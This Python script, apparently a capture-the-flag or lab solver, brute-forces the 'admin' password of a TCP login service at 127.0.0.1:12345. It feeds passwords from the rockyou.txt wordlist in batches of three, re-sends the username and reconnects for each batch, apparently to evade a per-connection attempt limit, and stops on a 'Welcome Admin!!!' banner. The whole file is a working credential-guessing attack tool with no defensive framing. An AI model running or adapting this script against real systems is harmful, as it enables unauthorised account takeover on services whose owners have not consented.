import socket
import time

def attempt_login(ip, port, username, passwords):
    # Create a socket and connect to the given IP and port
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))

        # Set socket timeout (e.g., 1 second)
        s.settimeout(1.0)  # Timeout for recv(), in seconds

        # Send the username "admin" initially
        s.sendall(f"{username}\n".encode())
        time.sleep(0.5)  # Wait briefly for the prompt
        response = s.recv(1024).decode().strip()

        # Try each password from the list
        for i, password in enumerate(passwords):
            print(f"Attempting password {i+1}: {password}")
            # Send the password
            s.sendall(f"{password}\n".encode())
            time.sleep(1)  # Wait for response

            try:
                # Attempt to receive the response from the server
                response = s.recv(1024).decode().strip()
                print(f"Sent: {password} | Response: {response}")
            except socket.timeout:
                # If no response is received within the timeout period, handle it
                response = ""
                print(f"Sent: {password} | Response: No response (timeout)\n")

            # Re-enter "admin" every 3 password attempts, regardless of the response
            if (i + 1) % 3 == 0:
                print("Re-entering admin after 3 attempts...")
                s.sendall(f"{username}\n".encode())  # Re-enter the username
                time.sleep(0.5)  # Wait for prompt again
                
                # Wait for the "Password:" prompt after re-entering admin
                try:
                    response = s.recv(1024).decode().strip()
                    print(f"\nRe-entered admin, Response: {response}")
                    if "Password:" not in response:
                        print("Unexpected response after re-entering admin.")
                        return False  # If we don't get Password: after re-entering, something went wrong
                except socket.timeout:
                    print("No response after re-entering admin, moving to next set of passwords.")
                    return False  # If there's no response, move on to next set

            # If the response is empty (no response), continue
            if not response:
                continue  # Proceed with the next password

            # Check if the response indicates success
            if "Welcome Admin!!!" in response:
                print(f"Success with password: {password}")
                return True
            
            # If the response indicates the password prompt is still there, just continue
            elif "Password:" in response:
                continue  # Proceed with the next password

            # If the response indicates login failure (optional), continue
            elif "incorrect" in response.lower():
                print(f"Failed with password: {password}")
                continue

        return False

def guess_login(ip, port, username, password_file):
    # Read the passwords from the file
    password_list = read_strings_from_file(password_file)

    # Loop through the password list in chunks of 3
    for i in range(0, len(password_list), 3):
        print(f"Attempting set {i // 3 + 1}: {password_list[i:i + 3]}")
        
        # Attempt login with the current set of 3 passwords
        if attempt_login(ip, port, username, password_list[i:i + 3]):
            print("Login successful!")
            return True
        
        # If we didn't succeed, try again with the next set of passwords
        print("Retrying with next set of passwords...")
        time.sleep(1)  # Adding a short delay before retrying
    
    print("All attempts failed.")
    return False

def read_strings_from_file(file_path):
    """Reads strings (passwords) from a file and returns them as a list."""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            strings = f.read().splitlines()  # Read all lines and remove newlines
        return strings
    except FileNotFoundError:
        print(f"Error: The file {file_path} was not found.")
        return []
    except UnicodeDecodeError as e:
        print(f"Error: Unable to decode the file {file_path}. {e}")
        return []

if __name__ == "__main__":
    ip = "127.0.0.1"  # Example IP
    port = 12345  # Example Port
    username = "admin"  # Username for login
    password_file = "/usr/share/wordlists/rockyou.txt"  # File containing passwords

    # Start the guess login attempt
    guess_login(ip, port, username, password_file)
